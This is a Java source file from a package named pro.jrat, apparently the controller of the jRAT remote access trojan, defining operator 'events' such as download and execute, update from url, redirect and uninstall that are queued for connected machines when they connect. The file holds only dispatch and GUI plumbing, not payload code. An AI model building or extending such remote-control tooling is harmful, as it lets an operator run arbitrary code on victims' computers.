package pro.jrat.events;

import java.util.ArrayList;
import java.util.HashMap;

import pro.jrat.ui.frames.Frame;
import pro.jrat.utils.Utils;


public class Events {

	public static ArrayList<String> events = new ArrayList<String>();
	public static HashMap<String, Event> queue = new HashMap<String, Event>();

	static {
		reload();
	}

	public static void reload() {
		events.clear();
		events.add("download and execute");
		events.add("open website");
		events.add("update from url");
		events.add("uninstall");
		events.add("redirect");
	}

	public static Event getEvent(String str, String name) {
		Event event = null;
		if (str.equalsIgnoreCase("download and execute")) {
			return new DownloadAndExecEvent(name);
		} else if (str.equalsIgnoreCase("open website")) {
			return new OpenWebsiteEvent(name);
		} else if (str.equalsIgnoreCase("update from url")) {
			return new UpdateFromURLEvent(name);
		} else if (str.equalsIgnoreCase("uninstall")) {
			return new UninstallEvent(name);
		} else if (str.equalsIgnoreCase("redirect")) {
			return new RedirectEvent(name);
		}
		return event;
	}

	public static Event getByName(String name) {
		return queue.get(name);
	}

	public static void remove(String name) {
		queue.remove(name);
	}

	public static void add(String val) {
		String name = Utils.showDialog("Event name", "Input event name");
		if (name == null) {
			return;
		}
		name = name.trim();
		Event event = getEvent(val, name);
		if (event != null) {
			if (event.add()) {
				Frame.onConnectModel.addRow(event.getDisplayData());
				queue.put(name, event);
			}
		}
	}

}
